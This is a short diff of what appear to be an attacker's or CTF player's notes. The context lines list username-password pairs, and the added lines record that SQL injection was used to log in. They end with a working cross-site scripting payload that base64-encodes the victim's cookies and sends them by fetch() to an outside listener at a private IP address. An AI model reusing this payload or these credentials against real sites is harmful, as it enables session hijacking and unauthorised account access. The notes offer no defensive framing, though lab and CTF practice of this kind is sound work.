@@ -61,3 +61,10 @@ admin:admin123
 jsmith:jsmith123
 
 // this might be useful once i get shel , if i get shell //
+
+
+USED SQL i to login, figure it out if you do it again
+
+Found that you can use XSS 
+
+<script>fetch('http://192.168.232.84:1111/?cookie=' + btoa(document.cookie));</script>
